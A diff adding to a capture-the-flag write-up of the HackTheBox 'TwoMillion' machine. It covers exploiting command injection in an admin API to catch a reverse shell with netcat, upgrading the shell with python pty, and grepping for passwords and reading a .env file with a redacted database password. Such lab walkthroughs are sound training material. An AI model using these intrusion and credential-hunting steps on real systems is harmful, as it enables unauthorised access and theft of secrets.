@@ -145,4 +145,50 @@ We have 3 "admin" APIs available too!
 ![[Pasted image 20250828190352.png]]
 
 Well! Now we are admin!
-Let's try to login again and checkout the portal. Nothing changes. So, checking the other two API endpoints for admin, when hitting the `/generate`, it asks for a `username`. As it turns out we can pass anything! So, thing indicated there may be a Command Injection vulnerability here!
+Let's try to login again and checkout the portal. Nothing changes. So, checking the other two API endpoints for admin, when hitting the `/generate`, it asks for a `username`. As it turns out we can pass anything! So, thing indicated there may be a Command Injection vulnerability here! But it just execute the command, does not show us the output! So, maybe let's simply try to get a reverse shell? Yes we can!
+```
+┌─[htb_lab_truelyyours]─[10.10.16.82]─[truelyyours@parrot]─[~/htb/twomillion]
+└──╼ [★]$ nc -nvlp 9001
+Listening on 0.0.0.0 9001
+Connection received on 10.10.11.221 50396
+bash: cannot set terminal process group (1194): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@2million:~/html$ 
+
+www-data@2million:~/html$ whoami
+www-data
+```
+
+Let's quickly prettify it!
+```
+www-data@2million:~/html$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+www-data@2million:~/html$ ls
+ls
+Database.php  VPN     controllers  fonts   index.php  views
+Router.php    assets  css	   images  js
+www-data@2million:~/html$ ^Z
+```
+On our terminal: `stty raw -echo;fg` and then `export TERM=xterm` and bob is your uncle!
+
+Next, I try to search for any password so I do `grep` (cause that is what I know!)
+```
+www-data@2million:~/html$ grep -i --color "password" ./*
+grep: ./VPN: Is a directory
+grep: ./assets: Is a directory
+grep: ./controllers: Is a directory
+grep: ./css: Is a directory
+grep: ./fonts: Is a directory
+grep: ./images: Is a directory
+./index.php:$dbPass = $envVariables['DB_PASSWORD'];
+grep: ./js: Is a directory
+grep: ./views: Is a directory
+```
+Looks likes password is being fetched from environment variables (Hence task 9! I guess.).
+```
+www-data@2million:~/html$ cat .env 
+DB_HOST=127.0.0.1
+DB_DATABASE=htb_prod
+DB_USERNAME=admin
+DB_PASSWORD=<REDACTED>
+```
